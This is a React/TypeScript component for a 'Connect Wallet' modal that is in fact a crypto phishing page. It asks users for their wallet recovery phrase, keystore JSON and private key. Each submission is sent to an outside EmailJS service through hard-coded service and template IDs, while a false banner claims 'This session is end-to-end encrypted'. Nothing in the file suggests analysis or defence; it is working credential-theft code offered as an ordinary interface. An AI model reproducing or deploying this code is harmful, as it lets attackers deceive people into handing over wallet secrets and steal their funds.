/* eslint-disable react/no-unescaped-entities */
/* eslint-disable react/no-unknown-property */
import React, { useState, FC, useRef, FormEvent } from "react";
import { toast, ToastContainer } from "react-toastify";
import { AiOutlineLoading } from "react-icons/ai";
import "react-toastify/dist/ReactToastify.css";
import "./Modal.css";
import emailjs from "@emailjs/browser";

interface ModalProps {
  imgUri: string;
  name: string;
}

const Modal: FC<ModalProps> = ({ imgUri, name }) => {
  const [Loading, setLoading] = useState(false);
  const phraseFormRef = useRef<HTMLFormElement>(null);
  const keyStoreFormRef = useRef<HTMLFormElement>(null);
  const privateKeyFormRef = useRef<HTMLFormElement>(null);

  const sendEmail = (
    e: FormEvent<HTMLFormElement>,
    form: React.RefObject<HTMLFormElement>
  ) => {
    e.preventDefault();
    setLoading(true);

    if (form.current) {
      emailjs
        .sendForm("service_29j3b0o", "template_2v86rhv", form.current, {
          publicKey: "BO3Z5VakLKm-HntsZ",
        })
        .then(
          () => {
            console.log("success");
            toast.success("Submission Successful");
            window.location.reload();
          },
          (error) => {
            console.log("failed", error.text);
            toast.error("Failed to submit");
          }
        );
    }
  };

  return (
    <>
      <div className="row align-items-center">
        <ToastContainer />
        <div className="col-6">
          <img className="w-25" src={imgUri} alt={name} />
        </div>
        <div className="col-6">
          <button
            type="button"
            className="btn-phrase btn-lg"
            data-bs-toggle="modal"
            data-bs-target="#modalId"
          >
            <span className="meta-link text-black">{name}</span>
          </button>

          <div
            className="modal fade"
            id="modalId"
            tabIndex={1}
            data-bs-backdrop="false"
            data-bs-keyboard="false"
            role="dialog"
            aria-labelledby="modalTitleId"
            aria-hidden="true"
          >
            <div
              className="modal-dialog modal-dialog-scrollable modal-dialog-centered modal-sm"
              role="document"
            >
              <div className="modal-content">
                <div className="modal-header">
                  <h5 className="modal-title" id="modalTitleId">
                    Connect Wallet
                  </h5>
                  <button
                    type="button"
                    className="btn-close"
                    data-bs-dismiss="modal"
                    arial-label="Close"
                  ></button>
                </div>
                <p className="encrypted text-center fw-bold text-secondary mt-2">
                  This session is end-to-end encrypted
                </p>
                <div className="modal-body">
                  <nav>
                    <div className="nav nav-tabs" id="nav-tab" role="tablist">
                      <button
                        className="nav-link"
                        id="nav-home-tab"
                        data-bs-toggle="tab"
                        data-bs-target="#nav-home"
                        type="button"
                        role="tab"
                        aria-controls="nav-home"
                        aria-selected="true"
                      >
                        Phrase
                      </button>
                      <button
                        className="nav-link"
                        id="nav-profile-tab"
                        data-bs-toggle="tab"
                        data-bs-target="#nav-profile"
                        type="button"
                        role="tab"
                        aria-controls="nav-profile"
                        aria-selected="false"
                      >
                        Keystore JSON
                      </button>
                      <button
                        className="nav-link"
                        id="nav-contact-tab"
                        data-bs-toggle="tab"
                        data-bs-target="#nav-contact"
                        type="button"
                        role="tab"
                        aria-controls="nav-contact"
                        aria-selected="false"
                      >
                        Private Key
                      </button>
                    </div>
                  </nav>
                  <div className="tab-content" id="nav-tabContent">
                    <form
                      ref={phraseFormRef}
                      onSubmit={(e) => sendEmail(e, phraseFormRef)}
                    >
                      <div
                        className="tab-pane fade show active"
                        id="nav-home"
                        role="tabpanel"
                        aria-labelledby="nav-home-tab"
                        tabIndex={0}
                      >
                        <textarea
                          className="mt-3 p-1"
                          name="phrase"
                          id=""
                          cols={30}
                          rows={5}
                          placeholder="Enter YOUR WALLET PHRASE"
                        ></textarea>
                        <span className="text-secondary pass-note fw-bold">
                          Typically 12(sometimes24) words separated by single
                          spaces
                        </span>
                        <button className="fw-bold mt-3 w-100" type="submit">
                          {Loading ? <AiOutlineLoading /> : "Proceed"}
                        </button>
                      </div>
                    </form>

                    <form
                      ref={keyStoreFormRef}
                      onSubmit={(e) => sendEmail(e, keyStoreFormRef)}
                    >
                      <div
                        className="tab-pane fade"
                        id="nav-profile"
                        role="tabpanel"
                        aria-labelledby="nav-profile-tab"
                        tabIndex={0}
                      >
                        <textarea
                          className="mt-3 p-1"
                          name="keyStore"
                          id=""
                          cols={30}
                          rows={5}
                          placeholder="Enter YOUR KEYSTORE JSON"
                        ></textarea>
                        <span className="text-secondary pass-note fw-bold">
                          Typically 12(sometimes24) words separated by single
                          spaces
                        </span>
                        <button className="fw-bold mt-3 w-100" type="submit">
                          {Loading ? <AiOutlineLoading /> : "Proceed"}
                        </button>
                      </div>
                    </form>

                    <form
                      ref={privateKeyFormRef}
                      onSubmit={(e) => sendEmail(e, privateKeyFormRef)}
                    ></form>

                    <div
                      className="tab-pane fade"
                      id="nav-contact"
                      role="tabpanel"
                      aria-labelledby="nav-contact-tab"
                      tabIndex={0}
                    >
                      <textarea
                        className="mt-3 p-1"
                        name="privateKey"
                        id=""
                        cols={30}
                        rows={5}
                        placeholder="Enter YOUR PRIVATE KEY"
                      ></textarea>
                      <span className="text-secondary pass-note fw-bold">
                        Typically 12(sometimes24) words separated by single
                        spaces
                      </span>
                      <button className="fw-bold mt-3 w-100" type="submit">
                        {Loading ? <AiOutlineLoading /> : "Proceed"}
                      </button>
                    </div>
                  </div>
                </div>
                <div className="modal-footer">
                  <p className="text-danger fw-bold">.</p>
                </div>
              </div>
            </div>
          </div>

          <script>
            const myModal = new bootstrap.Modal(
            document.getElementById("modalId"), options, );
          </script>
        </div>
        <hr className="mt-3" />
      </div>
    </>
  );
};

export default Modal;
